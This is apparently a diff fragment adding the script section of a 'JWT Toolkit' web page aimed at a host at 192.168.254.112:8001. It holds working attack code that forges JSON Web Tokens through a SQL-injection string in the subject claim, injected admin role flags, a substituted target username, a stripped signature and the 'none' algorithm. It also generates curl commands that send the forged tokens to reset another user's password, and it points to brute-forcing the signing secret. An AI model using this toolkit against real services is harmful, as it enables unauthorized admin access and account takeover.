+
+        function adminMethod3() {
+            const token = document.getElementById('adminToken').value.trim();
+            try {
+                const parts = token.split('.');
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                payload.sub = "admin' OR '1'='1";
+                
+                const newPayload = base64UrlEncode(JSON.stringify(payload));
+                const newToken = parts[0] + '.' + newPayload + '.' + parts[2];
+                
+                displayAdminResult('SQL Injection in username', newToken, payload);
+            } catch (e) {
+                document.getElementById('adminOutput').innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function adminMethod4() {
+            const token = document.getElementById('adminToken').value.trim();
+            try {
+                const parts = token.split('.');
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                payload.role = 'admin';
+                payload.admin = true;
+                payload.isAdmin = true;
+                
+                const newPayload = base64UrlEncode(JSON.stringify(payload));
+                const newToken = parts[0] + '.' + newPayload + '.' + parts[2];
+                
+                displayAdminResult('Role escalation (multiple admin flags)', newToken, payload);
+            } catch (e) {
+                document.getElementById('adminOutput').innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function displayAdminResult(method, token, payload) {
+            const url = document.getElementById('adminUrl').value;
+            const output = document.getElementById('adminOutput');
+            
+            let html = '<div class="output success">';
+            html += '<strong>✅ ' + method + '</strong><br><br>';
+            html += '<strong>New Payload:</strong><br><pre>' + JSON.stringify(payload, null, 2) + '</pre>';
+            html += '<br><strong>Token:</strong><br>' + token;
+            html += '<br><br><button onclick="copyToClipboard(\'' + token + '\')">📋 Copy Token</button>';
+            html += '</div>';
+            
+            html += '<div class="curl-command">curl -X GET ' + url + ' \\\n';
+            html += '  -H "Authorization: Bearer ' + token + '"</div>';
+            
+            output.innerHTML = html;
+        }
+
+        // Password Reset Functions
+        function resetMethod1() {
+            const token = document.getElementById('resetToken').value.trim();
+            const targetUser = document.getElementById('targetUser').value;
+            
+            try {
+                const parts = token.split('.');
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                payload.sub = targetUser;
+                payload.username = targetUser;
+                
+                const newPayload = base64UrlEncode(JSON.stringify(payload));
+                const newToken = parts[0] + '.' + newPayload + '.' + parts[2];
+                
+                displayResetResult('Changed username in token', newToken, payload);
+            } catch (e) {
+                document.getElementById('resetOutput').innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function resetMethod2() {
+            const token = document.getElementById('resetToken').value.trim();
+            const targetUser = document.getElementById('targetUser').value;
+            
+            try {
+                const parts = token.split('.');
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                payload.sub = targetUser;
+                
+                const newPayload = base64UrlEncode(JSON.stringify(payload));
+                const newToken = parts[0] + '.' + newPayload + '.';
+                
+                displayResetResult('Removed signature', newToken, payload);
+            } catch (e) {
+                document.getElementById('resetOutput').innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function resetMethod3() {
+            const token = document.getElementById('resetToken').value.trim();
+            const targetUser = document.getElementById('targetUser').value;
+            
+            try {
+                const parts = token.split('.');
+                const header = JSON.parse(base64UrlDecode(parts[0]));
+                const payload = JSON.parse(base64UrlDecode(parts[1]));
+                
+                header.alg = 'none';
+                payload.sub = targetUser;
+                
+                const newHeader = base64UrlEncode(JSON.stringify(header));
+                const newPayload = base64UrlEncode(JSON.stringify(payload));
+                const newToken = newHeader + '.' + newPayload + '.';
+                
+                displayResetResult('Algorithm to "none"', newToken, payload);
+            } catch (e) {
+                document.getElementById('resetOutput').innerHTML = '<div class="output error">❌ Error: ' + e.message + '</div>';
+            }
+        }
+
+        function resetMethod4() {
+            document.getElementById('resetOutput').innerHTML = '<div class="output warning">' +
+                '⚠️ <strong>This method requires:</strong><br><br>' +
+                '1. Brute force the JWT secret (use Weak Secrets tab)<br>' +
+                '2. Sign a new token with the found secret<br>' +
+                '3. Use the PowerShell script for proper signing</div>';
+        }
+
+        function displayResetResult(method, token, payload) {
+            const output = document.getElementById('resetOutput');
+            
+            let html = '<div class="output success">';
+            html += '<strong>✅ ' + method + '</strong><br><br>';
+            html += '<strong>Modified Payload:</strong><br><pre>' + JSON.stringify(payload, null, 2) + '</pre>';
+            html += '<br><strong>Token:</strong><br>' + token;
+            html += '<br><br><button onclick="copyToClipboard(\'' + token + '\')">📋 Copy Token</button>';
+            html += '</div>';
+            
+            output.innerHTML = html;
+        }
+
+        function generateResetCurl() {
+            const token = document.getElementById('resetToken').value.trim();
+            const url = document.getElementById('resetUrl').value;
+            const password = document.getElementById('newPassword').value;
+            const output = document.getElementById('resetOutput');
+            
+            const curl = 'curl -X POST ' + url + ' \\\n' +
+                '  -H "Authorization: Bearer ' + token + '" \\\n' +
+                '  -H "Content-Type: application/json" \\\n' +
+                '  -d \'{"password": "' + password + '"}\'';
+            
+            let html = '<div class="output success">';
+            html += '<strong>📋 cURL Command Generated</strong><br><br>';
+            html += '<div class="curl-command">' + curl + '</div>';
+            html += '<br><button onclick="copyToClipboard(\'' + curl.replace(/\n/g, ' ') + '\')">📋 Copy Command</button>';
+            html += '</div>';
+            
+            output.innerHTML = html;
+        }
+
+        // Utility Functions
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ Copied to clipboard!');
+            });
+        }
+
+        // Initialize
+        window.onload = function() {
+            console.log('🔐 JWT Toolkit Ready');
+            console.log('Target: 192.168.254.112:8001');
+        };
+    </script>
+</body>
+</html>
